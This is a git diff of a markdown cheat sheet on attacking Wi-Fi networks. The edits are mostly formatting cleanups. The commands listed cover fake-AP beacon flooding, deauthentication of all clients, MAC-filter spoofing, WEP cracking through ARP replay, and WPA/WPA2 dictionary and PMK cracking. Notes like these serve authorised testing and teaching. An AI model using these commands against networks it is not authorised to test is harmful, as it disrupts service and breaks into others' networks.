@@ -2,21 +2,21 @@
 
 **Powering up the wireless card**
 
-2. ifconfig wlan0 up ---> **start the wireless card** 
+2. ifconfig wlan0 up ---> start the wireless card** 
 
-3. airmon-ng start wlan0 <channel> ---> **monitor mode interface is created on top of the device for sniffing** 
+3. airmon-ng start wlan0 <channel> ---> monitor mode interface is created on top of the device for sniffing
 
 **Check active Access points and the stations/clients connecting to it**
 
-4. airodump-ng --band bn wlan0mon ---> **make the card hop through different channel and check wifi traffic**
+4. airodump-ng --band bn wlan0mon ---> make the card hop through different channel and check wifi traffic
 
-5. mdk3 wlan0mon b -n baba ---> **Creating a fake AP broadcasting beacons with SSID baba**
+5. mdk3 wlan0mon b -n baba ---> Creating a fake AP broadcasting beacons with SSID baba
 
 **Finding Hidden SSIDs**
 6. 
 
 		a. Passive way - monitor the network for clients to connect
-		b. active way - break all the connections between clients and Access point and further monitor the traffic for 				assocication traffic.
+		b. active way - break all the connections between clients and Access point and further monitor the traffic for assocication traffic.
 		
 		(send the deauthentication notification packet to the clients)
 		aireplay-ng --deauth 0 -a <BSSID> wlan0mon -D   
@@ -26,10 +26,9 @@
 
 7. Bypassing MAC filters
 
-		a. aireplay-ng --fakeauth 10 -e Logan wlan0mon  --> **Trying a fake authentication using the wireless card when MAC 			filter is 	
-		**off(open network)**
+		a. aireplay-ng --fakeauth 10 -e Logan wlan0mon  --> **Trying a fake authentication using the wireless card when MAC filter is off(open network)
 	
-		b. aireplay-ng --fakeauth 10 -e Logan wlan0mon -h <whiteListedMacAddress> --> **To spoof a mac address and fool the AP 			to allow authentication**
+		b. aireplay-ng --fakeauth 10 -e Logan wlan0mon -h <whiteListedMacAddress> --> To spoof a mac address and fool the AP to allow authentication
 		
 8. Cracking Shared/WEP encyption
 	
@@ -61,7 +60,7 @@
 11. Breaking WEP
 
 		a. airodump-ng --channel 6 wlan0mon --write <fileName> --bssid <bssid>  ---> Start dumping packets on the target channel 
-		b. aireplay-ng --arpreplay -e Logan -h <macAddressOfVictim> wlan0mon ---> Replay arp packets (In parallel fire this 			command)
+		b. aireplay-ng --arpreplay -e Logan -h <macAddressOfVictim> wlan0mon ---> Replay arp packets (In parallel fire this command)
 		c. aircrack-ng <capFile>  ---> Start cracking with aircrack
 
 12. Cracking WPA/WPA2 (Dictionary based attack)
@@ -74,7 +73,7 @@
 
 		a. airdecap-ng -e <essid> -p <passPhrase> <capturedPcapFile> -b <bssid>
 
-		Fastening up the process by pre-calculating the PMKs and then trying the Dictionary attack with the already generated 			PMKs.
+		Fastening up the process by pre-calculating the PMKs and then trying the Dictionary attack with the already generated PMKs.
 
 		b. genpmk -f <dictionaryFile> -s <ESSID> -d <outputFile>  ---> Preshared key or PMK list creation
 		c. cowpatty -d prePmks -s "Logan" -r malWpa2-01.cap  ---> Cracking with cowpatty
